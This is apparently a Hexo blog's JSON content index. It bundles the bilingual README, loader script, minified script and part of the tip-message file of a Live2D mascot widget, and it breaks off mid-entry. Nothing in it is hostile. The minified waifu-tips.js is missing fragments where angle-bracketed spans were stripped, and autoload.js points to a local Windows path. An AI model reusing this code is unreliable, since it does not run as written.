{"meta":{"title":"Darkness_Sword","subtitle":"站点副标题","description":"站点描述","author":"暮夜","url":"https://12yhy3.github.io","root":"/"},"pages":[{"title":"个人简介","date":"2024-11-25T01:29:22.000Z","updated":"2024-12-02T00:52:10.723Z","comments":false,"path":"about/index.html","permalink":"https://12yhy3.github.io/about/index.html","excerpt":"","text":"网站构建中…..博文图片暂时无法显示"},{"title":"我的歌单","date":"2024-11-25T13:22:49.000Z","updated":"2024-11-28T09:28:05.645Z","comments":false,"path":"playlist/index.html","permalink":"https://12yhy3.github.io/playlist/index.html","excerpt":"","text":""},{"title":"","date":"2024-12-05T13:43:15.503Z","updated":"2024-12-05T13:43:11.015Z","comments":false,"path":"live2d-widget-master/README.en.html","permalink":"https://12yhy3.github.io/live2d-widget-master/README.en.html","excerpt":"","text":"Live2D Widget 中文 FeaturesAdd Live2D widget to web page. Compatible with PJAX. (Note: The character models above are for demonstration purposes only and are not included in this repository.) You can also check out example web pages: Check the effect in the lower left corner of Mimi’s Blog demo.html to demonstrate basic functionality login.html to imitate the login interface of NPM UsageIf you are a beginner or only need the basic functionality, you can simply add the following line of code to the head or body of your HTML page to load the widget: 1&lt;script src=&quot;https://fastly.jsdelivr.net/gh/stevenjoezhang/live2d-widget@latest/autoload.js&quot;&gt;&lt;/script&gt; The placement of the code depends on how your website is built. For example, if you are using Hexo, you need to add the above code to the template file of your theme. The modification process is similar for pages generated using various template engines.If your website uses PJAX, since the widget does not need to be refreshed on every page, make sure to place the script outside the PJAX refresh area. However, we strongly recommend configuring the widget yourself to make it more suitable for your website!If you are interested in customizing the widget, please refer to the detailed instructions below. ConfigurationYou can refer to the source code of autoload.js to see the available configuration options. autoload.js will automatically load three files: waifu.css, live2d.min.js, and waifu-tips.js. waifu-tips.js creates the initWidget function, which is the main function for loading the widget. The initWidget function accepts an object-type parameter as the configuration for the widget. The following are the available options: Option Type Default Value Description waifuPath string https://fastly.jsdelivr.net/gh/stevenjoezhang/live2d-widget@latest/waifu-tips.json Path to the widget resources, can be modified apiPath string https://live2d.fghrsh.net/api/ API path, optional cdnPath string https://fastly.jsdelivr.net/gh/fghrsh/live2d_api/ CDN path, optional tools string[] see autoload.js Buttons of the loaded tools, optional Among them, the parameters apiPath and cdnPath only need to set one of them. apiPath is the URL of the backend API, which can be set up and modified by yourself (there are many things to modify, not discussed here). You can refer to live2d_api for more information. On the other hand, cdnPath is used to load resources through CDN services like jsDelivr, which provides better stability. CustomizationIf the options provided in the “Configuration” section above are not enough to meet your needs, you can make modifications yourself. The directory structure of this repository is as follows: src/waifu-tips.js contains the logic for the button and dialog box. waifu-tips.js is automatically generated by src/waifu-tips.js and it is not recommended to modify it directly. waifu-tips.json defines the triggering conditions (selector, CSS selector) and the displayed text when triggered (text). waifu.css is the style sheet for the virtual assistant. By default, the CSS selector rules in waifu-tips.json are effective for the Hexo NexT theme, but you may need to modify or add new content to make it suitable for your own website.Warning: The content in waifu-tips.json may not be suitable for all age groups or appropriate to access during work. Please ensure their suitability when using them. To deploy the development testing environment of this project locally, you need to install Node.js and npm, then execute the following commands: 123git clone https://github.com/stevenjoezhang/live2d-widget.gitnpm installnpm run build If you have any questions, feel free to raise an issue. If you have any modification suggestions, welcome to submit a pull request. DeployAfter making modifications locally, you can deploy the modified project on a server or load it via a CDN for use on a webpage. Using CDNTo customize the content, you can fork this repository and push the modified content to your own repository using git push. In this case, the usage method becomes: 1&lt;script src=&quot;https://fastly.jsdelivr.net/gh/username/live2d-widget@latest/autoload.js&quot;&gt;&lt;/script&gt; Replace username with your GitHub username. To ensure the content of the CDN is refreshed correctly, you need to create a new git tag and push it to the GitHub repository. Otherwise, @latest in the URL will still point to the previous version. Additionally, CDN itself has caching, so the changes may take some time to take effect. Relevant documentation: Git Basics - Tagging Managing releases in a repository Self-hostAlternatively, you can directly host these files on your server instead of loading them via CDN. If you can connect to your host via ssh, clone the forked and modified code repository onto your server. If your host cannot be accessed via ssh (e.g., a regular virtual host), modify the code locally and upload the files to the website directory on the host using ftp or similar methods. If you are deploying a static blog using Hexo or similar tools, place the code of this project in the blog’s source file directory (e.g., the source directory). When redeploying the blog, the relevant files will be automatically uploaded to the corresponding paths. To prevent these files from being incorrectly modified by Hexo plugins, you may need to set skip_render. Afterwards, the entire project can be accessed through your domain name. You can try opening the autoload.js and live2d.min.js files in your browser and confirm that their content is complete and correct.If everything is normal, you can proceed to modify the constant live2d_path in autoload.js to the URL of the live2d-widget directory. For example, if you can access live2d.min.js through the following URL: 1https://example.com/path/to/live2d-widget/live2d.min.js then modify the value of live2d_path to: 1https://example.com/path/to/live2d-widget/ Make sure to include the trailing / in the path.Once done, add the following code to the interface where you want to add the live2d-widget: 1&lt;script src=&quot;https://example.com/path/to/live2d-widget/autoload.js&quot;&gt;&lt;/script&gt; This will load the widget. Thanks Thanks to BrowserStack for providing the infrastructure that allows us to test in real browsers! Thanks to jsDelivr for providing public CDN service. The code is modified based on this blog post:https://www.fghrsh.net/post/123.html Thanks to Hitokoto for providing the sentence API. When you click on the paper airplane button of the virtual assistant, a hidden surprise will appear. This feature is from WebsiteAsteroids. MoreFor more information, you can refer to the following links:https://nocilol.me/archives/lab/add-dynamic-poster-girl-with-live2d-to-your-blog-02https://github.com/xiazeyu/live2d-widget.jshttps://github.com/summerscar/live2dDemo Regarding the backend API models:https://github.com/xiazeyu/live2d-widget-modelshttps://github.com/xiaoski/live2d_models_collection In addition to that, there are desktop versions available:https://github.com/amorist/platelethttps://github.com/akiroz/Live2D-Widgethttps://github.com/zenghongtu/PPethttps://github.com/LikeNeko/L2dPetForMac And also Wallpaper Engine:https://github.com/guansss/nep-live2d LicenseReleased under the GNU General Public License v3http://www.gnu.org/licenses/gpl-3.0.html This repository does not contain any models. The copyrights of all Live2D models, images, and motion data used for demonstration purposes belong to their respective original authors. They are provided for research and learning purposes only and should not be used for commercial purposes. Official Live2D websites:https://www.live2d.com/en/https://live2d.github.io Live2D Cubism Core is provided under the Live2D Proprietary Software License.https://www.live2d.com/eula/live2d-proprietary-software-license-agreement_en.htmlLive2D Cubism Components are provided under the Live2D Open Software License.http://www.live2d.com/eula/live2d-open-software-license-agreement_en.html The terms and conditions do prohibit modification, but obfuscating in live2d.min.js would not be considered illegal modification. https://community.live2d.com/discussion/140/webgl-developer-licence-and-javascript-question Update LogOn October 31, 2018, the original API provided by fghrsh was discontinued. Please update to the new address. Refer to the following article for more information:https://www.fghrsh.net/post/170.html Starting from January 1, 2020, this project no longer depends on jQuery. Starting from November 1, 2022, this project no longer requires users to separately load Font Awesome."},{"title":"","date":"2024-12-05T13:43:15.505Z","updated":"2024-12-05T13:43:11.042Z","comments":false,"path":"live2d-widget-master/README.html","permalink":"https://12yhy3.github.io/live2d-widget-master/README.html","excerpt":"","text":"Live2D Widget English 特性在网页中添加 Live2D 看板娘。兼容 PJAX，支持无刷新加载。 （注：以上人物模型仅供展示之用，本仓库并不包含任何模型。） 你也可以查看示例网页： 在 米米的博客 的左下角可查看效果 demo.html，展现基础功能 login.html，仿 NPM 的登陆界面 使用如果你是小白，或者只需要最基础的功能，那么只用将这一行代码加入 html 页面的 head 或 body 中，即可加载看板娘： 1&lt;script src=&quot;https://fastly.jsdelivr.net/gh/stevenjoezhang/live2d-widget@latest/autoload.js&quot;&gt;&lt;/script&gt; 添加代码的位置取决于你的网站的构建方式。例如，如果你使用的是 Hexo，那么需要在主题的模版文件中添加以上代码。对于用各种模版引擎生成的页面，修改方法类似。如果网站启用了 PJAX，由于看板娘不必每页刷新，需要注意将该脚本放到 PJAX 刷新区域之外。 但是！我们强烈推荐自己进行配置，让看板娘更加适合你的网站！如果你有兴趣自己折腾的话，请看下面的详细说明。 配置你可以对照 autoload.js 的源码查看可选的配置项目。autoload.js 会自动加载三个文件：waifu.css，live2d.min.js 和 waifu-tips.js。waifu-tips.js 会创建 initWidget 函数，这就是加载看板娘的主函数。initWidget 函数接收一个 Object 类型的参数，作为看板娘的配置。以下是配置选项： 选项 类型 默认值 说明 waifuPath string https://fastly.jsdelivr.net/gh/stevenjoezhang/live2d-widget@latest/waifu-tips.json 看板娘资源路径，可自行修改 apiPath string https://live2d.fghrsh.net/api/ API 路径，可选参数 cdnPath string https://fastly.jsdelivr.net/gh/fghrsh/live2d_api/ CDN 路径，可选参数 tools string[] 见 autoload.js 加载的小工具按钮，可选参数 其中，apiPath 和 cdnPath 两个参数设置其中一项即可。apiPath 是后端 API 的 URL，可以自行搭建，并增加模型（需要修改的内容比较多，此处不再赘述），可以参考 live2d_api。而 cdnPath 则是通过 jsDelivr 这样的 CDN 服务加载资源，更加稳定。 自定义如果以上「配置」部分提供的选项还不足以满足你的需求，那么你可以自己进行修改。本仓库的目录结构如下： src/waifu-tips.js 包含了按钮和对话框的逻辑； waifu-tips.js 是由 src/waifu-tips.js 自动打包生成的，不建议直接修改； waifu-tips.json 中定义了触发条件（selector，CSS 选择器）和触发时显示的文字（text）； waifu.css 是看板娘的样式表。 waifu-tips.json 中默认的 CSS 选择器规则是对 Hexo 的 NexT 主题 有效的，为了适用于你自己的网页，可能需要自行修改，或增加新内容。警告：waifu-tips.json 中的内容可能不适合所有年龄段，或不宜在工作期间访问。在使用时，请自行确保它们是合适的。 要在本地部署本项目的开发测试环境，你需要安装 Node.js 和 npm，然后执行以下命令： 123git clone https://github.com/stevenjoezhang/live2d-widget.gitnpm installnpm run build 如果有任何疑问，欢迎提 Issue。如果有任何修改建议，欢迎提 Pull Request。 部署在本地完成了修改后，你可以将修改后的项目部署在服务器上，或者通过 CDN 加载，以便在网页中使用。 使用 CDN要自定义有关内容，可以把这个仓库 Fork 一份，然后把修改后的内容通过 git push 到你的仓库中。这时，使用方法对应地变为 1&lt;script src=&quot;https://fastly.jsdelivr.net/gh/username/live2d-widget@latest/autoload.js&quot;&gt;&lt;/script&gt; 将此处的 username 替换为你的 GitHub 用户名。为了使 CDN 的内容正常刷新，需要创建新的 git tag 并推送至 GitHub 仓库中，否则此处的 @latest 仍然指向更新前的文件。此外 CDN 本身存在缓存，因此改动可能需要一定的时间生效。相关文档： Git Basics - Tagging Managing releases in a repository Self-host你也可以直接把这些文件放到服务器上，而不是通过 CDN 加载。 如果你能够通过 ssh 连接你的主机，请把 Fork 并修改后的代码仓库克隆到服务器上。 如果你的主机无法用 ssh 连接（例如一般的虚拟主机），请在本地修改好代码后，通过 ftp 等方式将文件上传到主机的网站的目录下。 如果你是通过 Hexo 等工具部署的静态博客，请把本项目的代码放在博客源文件目录下（例如 source 目录）。重新部署博客时，相关文件就会自动上传到对应的路径下。为了避免这些文件被 Hexo 插件错误地修改，可能需要设置 skip_render。 这样，整个项目就可以通过你的域名访问了。不妨试试能否正常地通过浏览器打开 autoload.js 和 live2d.min.js 等文件，并确认这些文件的内容是完整和正确的。一切正常的话，接下来修改 autoload.js 中的常量 live2d_path 为 live2d-widget 这一目录的 URL 即可。比如说，如果你能够通过 1https://example.com/path/to/live2d-widget/live2d.min.js 访问到 live2d.min.js，那么就把 live2d_path 的值修改为 1https://example.com/path/to/live2d-widget/ 路径末尾的 / 一定要加上。完成后，在你要添加看板娘的界面加入 1&lt;script src=&quot;https://example.com/path/to/live2d-widget/autoload.js&quot;&gt;&lt;/script&gt; 就可以加载了。 鸣谢 感谢 BrowserStack 容许我们在真实的浏览器中测试此项目。Thanks to BrowserStack for providing the infrastructure that allows us to test in real browsers! 感谢 jsDelivr 提供的 CDN 服务。Thanks jsDelivr for providing public CDN service. 代码自这篇博文魔改而来：https://www.fghrsh.net/post/123.html 感谢 一言 提供的语句接口。 点击看板娘的纸飞机按钮时，会出现一个彩蛋，这来自于 WebsiteAsteroids。 更多更多内容可以参考：https://nocilol.me/archives/lab/add-dynamic-poster-girl-with-live2d-to-your-blog-02https://github.com/xiazeyu/live2d-widget.jshttps://github.com/summerscar/live2dDemo 关于后端 API 模型：https://github.com/xiazeyu/live2d-widget-modelshttps://github.com/xiaoski/live2d_models_collection 除此之外，还有桌面版本：https://github.com/amorist/platelethttps://github.com/akiroz/Live2D-Widgethttps://github.com/zenghongtu/PPethttps://github.com/LikeNeko/L2dPetForMac 以及 Wallpaper Engine：https://github.com/guansss/nep-live2d 许可证Released under the GNU General Public License v3http://www.gnu.org/licenses/gpl-3.0.html 本仓库并不包含任何模型，用作展示的所有 Live2D 模型、图片、动作数据等版权均属于其原作者，仅供研究学习，不得用于商业用途。 Live2D 官方网站：https://www.live2d.com/en/https://live2d.github.io Live2D Cubism Core は Live2D Proprietary Software License で提供しています。https://www.live2d.com/eula/live2d-proprietary-software-license-agreement_en.htmlLive2D Cubism Components は Live2D Open Software License で提供しています。http://www.live2d.com/eula/live2d-open-software-license-agreement_en.html The terms and conditions do prohibit modification, but obfuscating in live2d.min.js would not be considered illegal modification. https://community.live2d.com/discussion/140/webgl-developer-licence-and-javascript-question 更新日志2018年10月31日，由 fghrsh 提供的原 API 停用，请更新至新地址。参考文章：https://www.fghrsh.net/post/170.html 2020年1月1日起，本项目不再依赖于 jQuery。 2022年11月1日起，本项目不再需要用户单独加载 Font Awesome。"},{"title":"","date":"2024-12-05T13:47:13.760Z","updated":"2024-12-05T13:47:13.760Z","comments":false,"path":"live2d-widget-master/autoload.js","permalink":"https://12yhy3.github.io/live2d-widget-master/autoload.js","excerpt":"","text":"// live2d_path 参数建议使用绝对路径 const live2d_path = \"D:\\My_blog_website\\source\\live2d-widget-master\"; //const live2d_path = \"/live2d-widget/\"; // 封装异步加载资源的方法 function loadExternalResource(url, type) { return new Promise((resolve, reject) => { let tag; if (type === \"css\") { tag = document.createElement(\"link\"); tag.rel = \"stylesheet\"; tag.href = url; } else if (type === \"js\") { tag = document.createElement(\"script\"); tag.src = url; } if (tag) { tag.onload = () => resolve(url); tag.onerror = () => reject(url); document.head.appendChild(tag); } }); } // 加载 waifu.css live2d.min.js waifu-tips.js if (screen.width >= 768) { Promise.all([ loadExternalResource(live2d_path + \"waifu.css\", \"css\"), loadExternalResource(live2d_path + \"live2d.min.js\", \"js\"), loadExternalResource(live2d_path + \"waifu-tips.js\", \"js\") ]).then(() => { // 配置选项的具体用法见 README.md initWidget({ waifuPath: live2d_path + \"waifu-tips.json\", //apiPath: \"https://live2d.fghrsh.net/api/\", cdnPath: \"https://fastly.jsdelivr.net/gh/fghrsh/live2d_api/\", tools: [\"hitokoto\", \"asteroids\", \"switch-model\", \"switch-texture\", \"photo\", \"info\", \"quit\"] }); }); } console.log(` く__,.ヘヽ. / ,ー､ 〉 ＼ ', !-─‐-i / /´ ／｀ｰ' L/／｀ヽ､ / ／, /| , , ', ｲ / /-‐/ ｉ L_ ﾊ ヽ! i ﾚ ﾍ 7ｲ｀ﾄ ﾚ'ｧ-ﾄ､!ハ| | !,/7 '0' ´0iソ| | |.从\" _ ,,,, / |./ | ﾚ'| i＞.､,,__ _,.イ / .i | ﾚ'| | / k_７_/ﾚ'ヽ, ﾊ. | | |/i 〈|/ i ,.ﾍ | i | .|/ / ｉ： ﾍ! ＼ | kヽ>､ﾊ _,.ﾍ､ /､! !'〈//｀Ｔ´', ＼ ｀'7'ｰr' ﾚ'ヽL__|___i,___,ンﾚ|ノ ﾄ-,/ |___./ 'ｰ' !_,.: `);"},{"title":"","date":"2024-12-05T13:43:15.507Z","updated":"2024-12-05T13:43:11.151Z","comments":false,"path":"live2d-widget-master/waifu-tips.js","permalink":"https://12yhy3.github.io/live2d-widget-master/waifu-tips.js","excerpt":"","text":"/*! * Live2D Widget * https://github.com/stevenjoezhang/live2d-widget */ !function(){\"use strict\";function e(e){return Array.isArray(e)?e[Math.floor(Math.random()*e.length)]:e}let t;function o(o,s,n){if(!o||sessionStorage.getItem(\"waifu-text\")&&sessionStorage.getItem(\"waifu-text\")>n)return;t&&(clearTimeout(t),t=null),o=e(o),sessionStorage.setItem(\"waifu-text\",n);const i=document.getElementById(\"waifu-tips\");i.innerHTML=o,i.classList.add(\"waifu-tips-active\"),t=setTimeout((()=>{sessionStorage.removeItem(\"waifu-text\"),i.classList.remove(\"waifu-tips-active\")}),s)}class s{constructor(e){let{apiPath:t,cdnPath:o}=e,s=!1;if(\"string\"==typeof o)s=!0,o.endsWith(\"/\")||(o+=\"/\");else{if(\"string\"!=typeof t)throw\"Invalid initWidget argument!\";t.endsWith(\"/\")||(t+=\"/\")}this.useCDN=s,this.apiPath=t,this.cdnPath=o}async loadModelList(){const e=await fetch(`${this.cdnPath}model_list.json`);this.modelList=await e.json()}async loadModel(t,s,n){if(localStorage.setItem(\"modelId\",t),localStorage.setItem(\"modelTexturesId\",s),o(n,4e3,10),this.useCDN){this.modelList||await this.loadModelList();const o=e(this.modelList.models[t]);loadlive2d(\"live2d\",`${this.cdnPath}model/${o}/index.json`)}else loadlive2d(\"live2d\",`${this.apiPath}get/?id=${t}-${s}`),console.log(`Live2D 模型 ${t}-${s} 加载完成`)}async loadRandModel(){const t=localStorage.getItem(\"modelId\"),s=localStorage.getItem(\"modelTexturesId\");if(this.useCDN){this.modelList||await this.loadModelList();const s=e(this.modelList.models[t]);loadlive2d(\"live2d\",`${this.cdnPath}model/${s}/index.json`),o(\"我的新衣服好看嘛？\",4e3,10)}else fetch(`${this.apiPath}rand_textures/?id=${t}-${s}`).then((e=>e.json())).then((e=>{1!==e.textures.id||1!==s&&0!==s?this.loadModel(t,e.textures.id,\"我的新衣服好看嘛？\"):o(\"我还没有其他衣服呢！\",4e3,10)}))}async loadOtherModel(){let e=localStorage.getItem(\"modelId\");if(this.useCDN){this.modelList||await this.loadModelList();const t=++e>=this.modelList.models.length?0:e;this.loadModel(t,0,this.modelList.messages[t])}else fetch(`${this.apiPath}switch/?id=${e}`).then((e=>e.json())).then((e=>{this.loadModel(e.model.id,0,e.model.message)}))}}const n={hitokoto:{icon:'\\x3c!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --\\x3e',callback:function(){fetch(\"https://v1.hitokoto.cn\").then((e=>e.json())).then((e=>{const t=`这句一言来自 「${e.from}」，是 ${e.creator} 在 hitokoto.cn 投稿的。`;o(e.hitokoto,6e3,9),setTimeout((()=>{o(t,4e3,9)}),6e3)}))}},asteroids:{icon:'\\x3c!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --\\x3e',callback:()=>{if(window.Asteroids)window.ASTEROIDSPLAYERS||(window.ASTEROIDSPLAYERS=[]),window.ASTEROIDSPLAYERS.push(new Asteroids);else{const e=document.createElement(\"script\");e.src=\"https://fastly.jsdelivr.net/gh/stevenjoezhang/asteroids/asteroids.js\",document.head.appendChild(e)}}},\"switch-model\":{icon:'\\x3c!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --\\x3e',callback:()=>{}},\"switch-texture\":{icon:'\\x3c!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --\\x3e',callback:()=>{}},photo:{icon:'\\x3c!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --\\x3e',callback:()=>{o(\"照好了嘛，是不是很可爱呢？\",6e3,9),Live2D.captureName=\"photo.png\",Live2D.captureFrame=!0}},info:{icon:'\\x3c!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --\\x3e',callback:()=>{open(\"https://github.com/stevenjoezhang/live2d-widget\")}},quit:{icon:'\\x3c!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --\\x3e',callback:()=>{localStorage.setItem(\"waifu-display\",Date.now()),o(\"愿你有一天能与重要的人重逢。\",2e3,11),document.getElementById(\"waifu\").style.bottom=\"-500px\",setTimeout((()=>{document.getElementById(\"waifu\").style.display=\"none\",document.getElementById(\"waifu-toggle\").classList.add(\"waifu-toggle-active\")}),3e3)}}};function i(t){const i=new s(t);function c(t){let s,n=!1,i=t.message.default;window.addEventListener(\"mousemove\",(()=>n=!0)),window.addEventListener(\"keydown\",(()=>n=!0)),setInterval((()=>{n?(n=!1,clearInterval(s),s=null):s||(s=setInterval((()=>{o(i,6e3,9)}),2e4))}),1e3),o(function(e){if(\"/\"===location.pathname)for(let{hour:t,text:o}of e){const e=new Date,s=t.split(\"-\")[0],n=t.split(\"-\")[1]||s;if(s{for(let{selector:n,text:i}of t.click)if(s.target.matches(n))return i=e(i),i=i.replace(\"{text}\",s.target.innerText),void o(i,4e3,8)})),t.seasons.forEach((({date:t,text:o})=>{const s=new Date,n=t.split(\"-\")[0],c=t.split(\"-\")[1]||n;n.split(\"/\")[0]{document.hidden||o(t.message.visibilitychange,6e3,9)}))}localStorage.removeItem(\"waifu-display\"),sessionStorage.removeItem(\"waifu-text\"),document.body.insertAdjacentHTML(\"beforeend\",'\\n \\n \\n \\n '),setTimeout((()=>{document.getElementById(\"waifu\").style.bottom=0}),0),function(){n[\"switch-model\"].callback=()=>i.loadOtherModel(),n[\"switch-texture\"].callback=()=>i.loadRandModel(),Array.isArray(t.tools)||(t.tools=Object.keys(n));for(let e of t.tools)if(n[e]){const{icon:t,callback:o}=n[e];document.getElementById(\"waifu-tool\").insertAdjacentHTML(\"beforeend\",`${t}`),document.getElementById(`waifu-tool-${e}`).addEventListener(\"click\",o)}}(),function(){let e=localStorage.getItem(\"modelId\"),o=localStorage.getItem(\"modelTexturesId\");null===e&&(e=1,o=53),i.loadModel(e,o),fetch(t.waifuPath).then((e=>e.json())).then(c)}()}window.initWidget=function(e,t){\"string\"==typeof e&&(e={waifuPath:e,apiPath:t}),document.body.insertAdjacentHTML(\"beforeend\",'\\n 看板娘\\n ');const o=document.getElementById(\"waifu-toggle\");o.addEventListener(\"click\",(()=>{o.classList.remove(\"waifu-toggle-active\"),o.getAttribute(\"first-time\")?(i(e),o.removeAttribute(\"first-time\")):(localStorage.removeItem(\"waifu-display\"),document.getElementById(\"waifu\").style.display=\"\",setTimeout((()=>{document.getElementById(\"waifu\").style.bottom=0}),0))})),localStorage.getItem(\"waifu-display\")&&Date.now()-localStorage.getItem(\"waifu-display\"){o.classList.add(\"waifu-toggle-active\")}),0)):i(e)}}();"},{"title":"","date":"2024-12-05T13:43:15.508Z","updated":"2024-12-05T13:43:11.167Z","comments":false,"path":"live2d-widget-master/waifu-tips.json","permalink":"https://12yhy3.github.io/live2d-widget-master/waifu-tips.json","excerpt":"","text":"{\"mouseover\":[{\"selector\":\"#live2d\",\"text\":[\"干嘛呢你，快把手拿开～～\",\"鼠…鼠标放错地方了！\",\"你要干嘛呀？\",\"喵喵喵？\",\"怕怕(ノ≧∇≦)ノ\",\"非礼呀！救命！\",\"这样的话，只能使用武力了！\",\"我要生气了哦\",\"不要动手动脚的！\",\"真…真的是不知羞耻！\",\"Hentai！\"]},{\"selector\":\"#waifu-tool-hitokoto\",\"text\":[\"猜猜我要说些什么？\",\"我从青蛙王子那里听到了不少人生经验。\"]},{\"selector\":\"#waifu-tool-asteroids\",\"text\":[\"要不要来玩飞机大战？\",\"这个按钮上写着「不要点击」。\",\"怎么，你想来和我玩个游戏？\",\"听说这样可以蹦迪！\"]},{\"selector\":\"#waifu-tool-switch-model\",\"text\":[\"你是不是不爱人家了呀，呜呜呜～\",\"要见见我的姐姐嘛？\",\"想要看我妹妹嘛？\",\"要切换看板娘吗？\"]},{\"selector\":\"#waifu-tool-switch-texture\",\"text\":[\"喜欢换装 PLAY 吗？\",\"这次要扮演什么呢？\",\"变装！\",\"让我们看看接下来会发生什么！\"]},{\"selector\":\"#waifu-tool-photo\",\"text\":[\"你要给我拍照呀？一二三～茄子～\",\"要不，我们来合影吧！\",\"保持微笑就好了～\"]},{\"selector\":\"#waifu-tool-info\",\"text\":[\"想要知道更多关于我的事么？\",\"这里记录着我搬家的历史呢。\",\"你想深入了解我什么呢？\"]},{\"selector\":\"#waifu-tool-quit\",\"text\":[\"到了要说再见的时候了吗？\",\"呜呜 QAQ 后会有期……\",\"不要抛弃我呀……\",\"我们，还能再见面吗……\",\"哼，你会后悔的！\"]},{\"selector\":\".menu-item-home a\",\"text\":[\"点击前往首页，想回到上一页可以使用浏览器的后退功能哦。\",\"点它就可以回到首页啦！\",\"回首页看看吧。\"]},{\"selector\":\".menu-item-about a\",\"text\":[\"你想知道我家主人是谁吗？\",\"这里有一些关于我家主人的秘密哦，要不要看看呢？\",\"发现主人出没地点！\"]},{\"selector\":\".menu-item-tags a\",\"text\":[\"点击就可以看文章的标签啦！\",\"点击来查看所有标签哦。\"]},{\"selector\":\".menu-item-categories a\",\"text\":[\"文章都分类好啦～\",\"点击来查看文章分类哦。\"]},{\"selector\":\".menu-item-archives a\",\"text\":[\"翻页比较麻烦吗，那就来看看文章归档吧。\",\"文章目录都整理在这里啦！\"]},{\"selector\":\".menu-item-friends a\",\"text\":[\"这是我的朋友们哦ヾ(◍°∇°◍)ﾉﾞ\",\"要去大佬们的家看看吗？\",\"要去拜访一下我的朋友们吗？\"]},{\"selector\":\".menu-item-search a\",\"text\":[\"找不到想看的内容？搜索看看吧！\",\"在找什么东西呢，需要帮忙吗？\"]},{\"selector\":\".menu-item a\",\"text\":[\"快看看这里都有什么呢？\"]},{\"selector\":\".site-author\",\"text\":[\"我家主人好看吗？\",\"这是我家主人(*´∇｀*)\"]},{\"selector\":\".site-state\",\"text\":[\"这是文章的统计信息～\",\"要不要点进去看看？\"]},{\"selector\":\".feed-link a\",\"text\":[\"这里可以使用 RSS 订阅呢！\",\"利用 feed 订阅器，就能快速知道博客有没有更新了呢。\"]},{\"selector\":\".cc-opacity, .post-copyright-author\",\"text\":[\"要记得规范转载哦。\",\"所有文章均采用 CC BY-NC-SA 4.0 许可协议～\",\"转载前要先注意下文章的版权协议呢。\"]},{\"selector\":\".links-of-author\",\"text\":[\"这里是主人的常驻地址哦。\",\"这里有主人的联系方式！\"]},{\"selector\":\".followme\",\"text\":[\"手机扫一下就能继续看，很方便呢～\",\"扫一扫，打开新世界的大门！\"]},{\"selector\":\".fancybox img, img.medium-zoom-image\",\"text\":[\"点击图片可以放大呢！\"]},{\"selector\":\".copy-btn\",\"text\":[\"代码可以直接点击复制哟。\"]},{\"selector\":\".highlight .table-container, .gist\",\"text\":[\"GitHub！我是新手！\",\"PHP 是最好的语言！\"]},{\"selector\":\"a[href^='mailto']\",\"text\":[\"邮件我会及时回复的！\",\"点击就可以发送邮件啦～\"]},{\"selector\":\"a[href^='/tags/']\",\"text\":[\"要去看看 {text} 标签么？\",\"点它可以查看此标签下的所有文章哟！\"]},{\"selector\":\"a[href^='/categories/']\",\"text\":[\"要去看看 {text} 分类么？\",\"点它可以查看此分类下的所有文章哟！\"]},{\"selector\":\".post-title-link\",\"text\":[\"要看看 {text} 这篇文章吗？\"]},{\"selector\":\"a[rel='contents']\",\"text\":[\"点击来阅读全文哦。\"]},{\"selector\":\"a[itemprop='discussionUrl']\",\"text\":[\"要去看看评论吗？\"]},{\"selector\":\".beian a\",\"text\":[\"我也是有户口的人哦。\",\"我的主人可是遵纪守法的好主人。\"]},{\"selector\":\".container a[href^='http'], .nav-link .nav-text\",\"text\":[\"要去看看 {text} 么？\",\"去 {text} 逛逛吧。\",\"到 {text} 看看吧。\"]},{\"selector\":\".back-to-top\",\"text\":[\"点它就可以回到顶部啦！\",\"又回到最初的起点～\",\"要回到开始的地方么？\"]},{\"selector\":\".reward-container\",\"text\":[\"我是不是棒棒哒～快给我点赞吧！\",\"要打赏我嘛？好期待啊～\",\"主人最近在吃土呢，很辛苦的样子，给他一些钱钱吧～\"]},{\"selector\":\"#wechat\",\"text\":[\"这是我的微信二维码～\"]},{\"selector\":\"#alipay\",\"text\":[\"这是我的支付宝哦！\"]},{\"selector\":\"#bitcoin\",\"text\":[\"这是我的比特币账号！\"]},{\"selector\":\"#needsharebutton-postbottom .btn\",\"text\":[\"好东西要让更多人知道才行哦。\",\"觉得文章有帮助的话，可以分享给更多需要的朋友呢。\"]},{\"selector\":\".need-share-button_weibo\",\"text\":[\"微博？来分享一波喵！\"]},{\"selector\":\".need-share-button_wechat\",\"text\":[\"分享到微信吧！\"]},{\"selector\":\".need-share-button_douban\",\"text\":[\"分享到豆瓣好像也不错！\"]},{\"selector\":\".need-share-button_qqzone\",\"text\":[\"QQ 空间，一键转发，耶～\"]},{\"selector\":\".need-share-button_twitter\",\"text\":[\"Twitter？好像是不存在的东西？\"]},{\"selector\":\".need-share-button_facebook\",\"text\":[\"emmm…FB 好像也是不存在的东西？\"]},{\"selector\":\".post-nav-item a[rel='next']\",\"text\":[\"来看看下一篇文章吧。\",\"点它可以看下一篇文章哦！\",\"要翻到下一篇文章吗？\"]},{\"selector\":\".post-nav-item 